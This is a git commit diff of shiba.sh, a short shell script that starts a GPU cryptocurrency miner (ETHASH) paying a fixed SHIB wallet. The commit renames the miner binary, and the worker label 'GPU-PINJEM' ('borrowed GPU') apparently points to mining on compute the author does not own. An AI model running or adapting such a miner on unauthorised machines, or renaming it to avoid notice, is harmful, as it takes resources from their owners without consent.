7c589cdb76c11ccb93c909f78d8083a71d9d1fcf
angkii <83603708+angkii@users.noreply.github.com>
2021-06-15 19:49:55 +0700

    Update shiba.sh

--- shiba.sh
+++ shiba.sh
@@ -6,9 +6,9 @@ WALLET=SHIB:0xb13f91835c32249e1506da1201e937d666652725
 
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
 
-chmod +x nbgpu
+chmod +x tuyulgpu
 
-./nbgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
 
 
 
